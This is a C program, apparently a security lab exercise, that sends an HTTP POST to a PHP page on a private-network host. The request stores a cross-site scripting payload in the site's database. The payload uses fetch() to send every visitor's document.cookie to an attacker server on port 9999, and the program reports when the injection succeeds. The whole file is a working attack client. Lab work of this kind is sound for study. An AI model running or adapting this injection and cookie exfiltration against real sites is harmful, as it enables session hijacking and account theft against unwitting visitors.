/*
 * ex3_db_insert_stored.c
 * 
 * Stored XSS Attack Demonstration - Payload Injection Client
 * 
 * This program acts as an HTTP client that sends a POST request to
 * task2stored.php to inject a malicious JavaScript payload into the
 * database. The payload will steal session cookies and send them to
 * the attacker's server at 192.168.1.201:9999.
 * 
 * Compilation: gcc -Wall -Wextra -Werror -Wconversion ex3_db_insert_stored.c -o ex3_db_insert_stored
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define TARGET_HOST "192.168.1.203"
#define TARGET_PORT 80
#define TARGET_PATH "/task2stored.php"
#define ATTACKER_SERVER "192.168.1.201:9999"
#define BUFFER_SIZE 4096

/*
 * url_encode - URL encodes a string
 * @dest: Destination buffer for encoded string
 * @dest_size: Size of destination buffer
 * @src: Source string to encode
 * 
 * Returns: 0 on success, -1 on error
 */
static int url_encode(char *dest, size_t dest_size, const char *src) {
    size_t dest_pos = 0;
    
    while (*src != '\0' && dest_pos < dest_size - 4) {
        if ((*src >= 'a' && *src <= 'z') ||
            (*src >= 'A' && *src <= 'Z') ||
            (*src >= '0' && *src <= '9') ||
            *src == '-' || *src == '_' || *src == '.' || *src == '~') {
            dest[dest_pos++] = *src;
        } else {
            int written = snprintf(&dest[dest_pos], dest_size - dest_pos,
                                  "%%%02X", (unsigned char)*src);
            if (written < 0 || dest_pos + (size_t)written >= dest_size) {
                return -1;
            }
            dest_pos += (size_t)written;
        }
        src++;
    }
    
    if (dest_pos >= dest_size) {
        return -1;
    }
    
    dest[dest_pos] = '\0';
    return 0;
}

int main(void) {
    int sock_fd;
    struct sockaddr_in server_addr;
    char xss_payload[512];
    char encoded_payload[2048];
    char post_data[2048];
    char http_request[4096];
    char response_buffer[BUFFER_SIZE];
    ssize_t bytes_sent;
    ssize_t bytes_received;

    snprintf(xss_payload, sizeof(xss_payload),
             "<script>fetch('http://%s/?cookie='+document.cookie)</script>",
             ATTACKER_SERVER);

    if (url_encode(encoded_payload, sizeof(encoded_payload), xss_payload) != 0) {
        fprintf(stderr, "Error: Failed to URL encode payload\n");
        return 1;
    }

    printf("XSS Payload: %s\n", xss_payload);
    printf("Encoded Payload: %s\n", encoded_payload);

    snprintf(post_data, sizeof(post_data),
             "message=%s&submit=Submit", encoded_payload);

    size_t content_length = strlen(post_data);

    snprintf(http_request, sizeof(http_request),
             "POST %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Content-Length: %zu\r\n"
             "Connection: close\r\n"
             "\r\n"
             "%s",
             TARGET_PATH, TARGET_HOST, content_length, post_data);

    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);

    if (inet_pton(AF_INET, TARGET_HOST, &server_addr.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock_fd);
        return 1;
    }

    printf("Connecting to %s:%d...\n", TARGET_HOST, TARGET_PORT);

    if (connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock_fd);
        return 1;
    }

    printf("Connected successfully.\n");
    printf("Sending POST request...\n\n");
    printf("--- HTTP Request ---\n%s\n", http_request);

    bytes_sent = write(sock_fd, http_request, strlen(http_request));
    if (bytes_sent < 0) {
        perror("Send failed");
        close(sock_fd);
        return 1;
    }

    printf("Request sent (%zd bytes).\n", bytes_sent);
    printf("Waiting for response...\n\n");

    memset(response_buffer, 0, BUFFER_SIZE);
    bytes_received = read(sock_fd, response_buffer, BUFFER_SIZE - 1);
    if (bytes_received < 0) {
        perror("Receive failed");
        close(sock_fd);
        return 1;
    }

    response_buffer[bytes_received] = '\0';
    printf("--- HTTP Response ---\n%s\n", response_buffer);

    close(sock_fd);

    if (strstr(response_buffer, "200 OK") != NULL ||
        strstr(response_buffer, "302 Found") != NULL ||
        strstr(response_buffer, "success") != NULL) {
        printf("\n[SUCCESS] Payload injected successfully!\n");
        printf("The malicious script has been stored in the database.\n");
        printf("When a victim visits the page, their cookie will be sent to %s\n", ATTACKER_SERVER);
    } else {
        printf("\n[WARNING] Response received but injection status unclear.\n");
        printf("Check the application manually to verify if the payload was stored.\n");
    }

    return 0;
}
